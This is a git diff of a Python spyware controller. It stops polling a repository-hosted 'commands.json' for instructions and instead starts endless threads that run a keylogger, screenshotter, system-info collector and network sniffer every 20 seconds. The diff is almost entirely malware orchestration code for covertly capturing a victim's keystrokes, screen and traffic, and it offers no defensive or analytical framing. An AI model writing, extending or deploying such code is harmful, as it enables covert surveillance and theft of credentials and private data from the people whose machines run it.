@@ -12,10 +12,11 @@ from sniffer import Sniffer
 import psutil
 import time
 import json
+import threading
 
-def command_listener():
-    contents = repo.get_contents("commands.json")
-    return contents.decoded_content
+#def command_listener():
+    #contents = repo.get_contents("commands.json")
+    #return contents.decoded_content
 
 def mod_keylogger():
     k = Keylogger()
@@ -34,29 +35,19 @@ def mod_sniffer():
     s = Sniffer()
     s.start_sniffing()
 
-def start_program():
-    json_commands = command_listener()
-    decoded_commands = json.loads(json_commands)
-    for command in decoded_commands["commands"]:
-        type = command["command"]
-        match type:
-            case 'keylogger':
-                print("Started keylogging")
-                mod_keylogger()
-                print("Ended keylogging")
-            case 'screenshot':                            
-                print("Started screenshotting")
-                mod_screenshotter()
-                print("Stopped screenshotting")
-            case 'sysinfo':
-                print("Started the sysinfo")
-                mod_sysinfo()
-                print("Stopped the sysinfo")
-            case 'sniffer':
-                print("Started sniffing")
-                mod_sniffer()
-                print("Stopped sniffing")
+def start_program(module_func, interval):
+    while True:
+        module_func()
+        time.sleep(interval)
+    
+screenshot_thread = threading.Thread(target=start_program, args=(mod_screenshotter, 20))
+sysinfo_thread = threading.Thread(target=start_program, args=(mod_sysinfo,20))
+sniffer_thread = threading.Thread(target=start_program, args=(mod_sniffer,20))
+keylogger_thread = threading.Thread(target=start_program, args=(mod_keylogger,20))
+screenshot_thread.start()
+sysinfo_thread.start()
+sniffer_thread.start()
+keylogger_thread.start()
 
-while True:
-    start_program()
- 
+
+
